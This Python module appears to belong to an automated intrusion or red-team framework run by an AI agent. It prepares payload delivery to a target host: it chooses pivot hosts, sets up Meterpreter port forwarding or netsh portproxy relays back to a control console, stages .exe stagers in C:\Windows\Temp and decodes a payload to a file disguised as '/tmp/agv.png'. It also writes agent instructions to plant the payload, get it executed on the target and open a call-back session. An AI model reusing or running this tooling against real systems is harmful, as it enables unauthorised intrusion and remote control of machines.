"""Delivery setup: prepare the resources one declared handover needs."""
import base64
from uuid import uuid4

from runtime import relay, session_registry, session_resources
from runtime.delivery_commands import (
    DELIVERY_MATERIALS_DIR,
    build_delivery_declaration,
    relay_delivery_declaration,
)
from runtime.session_delivery import begin_session_delivery

from . import session_flow
from .contracts import DeliveryState


def begin_delivery(
    *,
    spec,
    target_host,
    scope,
    carrier,
    executor,
    control,
    rpc_conf,
    root,
    node_id,
    run_dir,
    task,
    delivery: DeliveryState,
):
    if not rpc_conf:
        raise ValueError("SESSION_DELIVERY_ENDPOINT_REQUIRED")

    declaration = spec.get("delivery")
    if declaration is None and str(spec.get("transport") or "") == "relay":
        if carrier is None:
            raise ValueError("SESSION_DELIVERY_CARRIER_REQUIRED")
        pivot = relay.pivot_address(
            executor, target_host=target_host, carrier=carrier
        )
        if not pivot:
            raise ValueError("SESSION_DELIVERY_PIVOT_UNREACHABLE")
        pivot_port = session_resources.free_pivot_port(
            carrier,
            taken=[
                port for _host, port in
                session_registry.held_resources(root, host=pivot)
            ],
        )
        if not pivot_port:
            raise ValueError("SESSION_DELIVERY_NO_FREE_PIVOT_PORT")
        free = session_resources.free_delivery_ports(executor)
        if not free:
            raise ValueError("SESSION_DELIVERY_NO_FREE_PORT")

        remote = dict(spec.get("remote") or {})
        delivery.built_declaration = relay_delivery_declaration(
            spec=spec,
            control=control,
            target_host=target_host,
            pivot=pivot,
            pivot_port=pivot_port,
            handler_port=free[0],
            materials_dir=DELIVERY_MATERIALS_DIR,
            nonce=uuid4().hex[:10],
            remote_dir=str(remote.get("dir") or "C:\\Windows\\Temp"),
            suffix=str(remote.get("suffix") or ".exe"),
            target_port=str((scope or {}).get("port") or ""),
        )
        declaration = delivery.built_declaration
        delivery.relay_facts = {
            "pivot": pivot,
            "pivot_port": pivot_port,
            "handler_port": free[0],
            "route": (
                "meterpreter-portfwd"
                if relay.meterpreter_carrier(carrier)
                else "netsh-portproxy"
            ),
        }
    elif declaration is None and spec.get("payload"):
        free = session_resources.free_delivery_ports(executor)
        if not free:
            raise ValueError("SESSION_DELIVERY_NO_FREE_PORT")
        delivery.built_declaration = build_delivery_declaration(
            spec,
            control=control,
            target_host=target_host,
            materials_dir=DELIVERY_MATERIALS_DIR,
            nonce=uuid4().hex[:10],
            handler_port=free[0],
            target_port=str((scope or {}).get("port") or ""),
            fetch_port=(
                free[1]
                if str(spec.get("transport") or "scp") == "http"
                and len(free) > 1
                else None
            ),
        )
        declaration = delivery.built_declaration

    delivery.plan = begin_session_delivery(
        executor=executor,
        rpc_conf=rpc_conf,
        root=root,
        node=node_id,
        target_host=target_host,
        declaration=declaration,
    )
    if delivery.relay_facts is not None:
        materials = declaration["materials"]
        staged = session_flow.stage_file_into_console(
            executor,
            carrier,
            source=materials["stager"],
            remote=materials["remote_stager"],
        )
        task["inputs"]["delivery_pivot_stager"] = str(staged["remote"])
        armed = relay.arm_return(
            executor,
            carrier=carrier,
            listen_host=delivery.relay_facts["pivot"],
            listen_port=delivery.relay_facts["pivot_port"],
            console_host=control,
            console_port=delivery.relay_facts["handler_port"],
            route=delivery.relay_facts["route"],
            run_dir=run_dir,
            node=node_id,
        )
        if not str(armed.get("ok")):
            raise ValueError(
                "SESSION_DELIVERY_RETURN_UNCONFIRMED: "
                + str(armed.get("reason") or "")
            )
        delivery.relay_facts.update(
            remote_stager=materials["remote_stager"],
            stager=materials["stager"],
        )


def add_delivery_inputs(*, task, delivery: DeliveryState, executor):
    plan_session = delivery.plan
    task["inputs"]["delivery_command"] = plan_session["command"]
    materials = (
        (plan_session.get("declaration") or {}).get("materials") or {}
    )
    plant = str(materials.get("stage_payload") or "")
    if plant:
        blob = base64.b64encode(plant.encode("utf-8")).decode("ascii")
        task["inputs"]["delivery_plant_path"] = "/tmp/agv.png"
        task["inputs"]["delivery_plant_command"] = (
            "printf %%s %s | base64 -d > %s" % (blob, "/tmp/agv.png")
        )

    authorize = str(materials.get("authorize_command") or "")
    if authorize:
        task["inputs"]["must_deliver_session"] = (
            "Run delivery_authorize_command, then delivery_command, and report the "
            "delivery receipts honestly. The runtime receives and registers the "
            "session after your report; do not claim registration before observing it. "
            "A readback-only result is an unsatisfied node. The plant command prints "
            "nothing: exit code 0 confirms it completed, so run it once and move on "
            "instead of re-running it. If no target effect is observed, report "
            "uncertain with an empty citation list."
        )
    else:
        task["inputs"]["must_deliver_session"] = (
            "Plant **delivery_payload** where the target will read it (the card's "
            "own payload is the plain echo variant and will not call back), get it "
            "executed on the target, then run delivery_command. Report the delivery "
            "receipts honestly. The runtime receives and registers the session after "
            "your report; do not claim registration before observing it. A "
            "readback-only result is an unsatisfied node. The plant command prints "
            "nothing: exit code 0 confirms it completed, so run it once and move on "
            "instead of re-running it. If no target effect is observed, report "
            "uncertain with an empty citation list."
        )

    if delivery.built_declaration:
        materials = delivery.built_declaration["materials"]
        if materials.get("key_path"):
            task["inputs"]["delivery_key_path"] = materials["key_path"]
        if materials.get("public_key"):
            public = executor(
                ["/bin/sh", "-c", "cat %s" % materials["public_key"]],
                30.0,
            )
            task["inputs"]["delivery_public_key"] = str(
                getattr(public, "stdout", "") or ""
            ).strip()
        if materials.get("remote_stager"):
            task["inputs"]["delivery_remote_stager"] = materials["remote_stager"]
        if materials.get("pivot_stager"):
            task["inputs"]["delivery_pivot_stager"] = materials["pivot_stager"]
        if materials.get("authorize_command"):
            task["inputs"]["delivery_authorize_command"] = (
                materials["authorize_command"]
            )
        if materials.get("stage_payload"):
            task["inputs"]["delivery_payload"] = materials["stage_payload"]
